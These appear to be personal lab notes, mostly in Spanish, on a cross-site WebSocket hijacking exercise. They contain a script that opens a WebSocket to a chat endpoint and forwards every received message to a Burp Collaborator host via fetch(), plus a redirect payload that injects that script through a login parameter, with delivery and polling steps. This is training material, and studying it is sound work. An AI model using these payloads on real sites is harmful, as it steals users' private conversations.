![[Pasted image 20230610071823.png]]

tomado de: https://youtu.be/7k4if4HBu5s

payloads:

#1
script:
	var ws = new WebSocket('wss://LAB-ID.net/chat');
	ws.onopen = function() {
		ws.send("READY");
	};
	ws.onmessage = function(event){
		fetch('https://BURP-COLLABORATOR-LAB.com', {method: 'POST', mode: 'no-cors', body: event.data});
	};
script

#2
script:
	document.location = "https://cms-LAB-ID.net/login?username=LOCAL-URL-ENCODED-CSWSH-SCRIPT&password=anything";
script


![[Pasted image 20230703202511.png]]

![[Pasted image 20230703202604.png]]

me voy al exploit server y empezamos a probar los payloads:

![[Pasted image 20230703202805.png]]

inicio el burp collaborator:

![[Pasted image 20230703202847.png]]

hn8pxbsrnz5393vhayw9t018qzwqkf.oastify.com

![[Pasted image 20230703203011.png]]

ojo en la forma en que pego los links, en la foto de arriba en el websocket el endpoint tiene 2 slashes y eso me impedia la ejecucion del payload, tambien el intercept debe estar en off

luego store y deliver to the victim, luego voy al collaborator e inicio el poll:

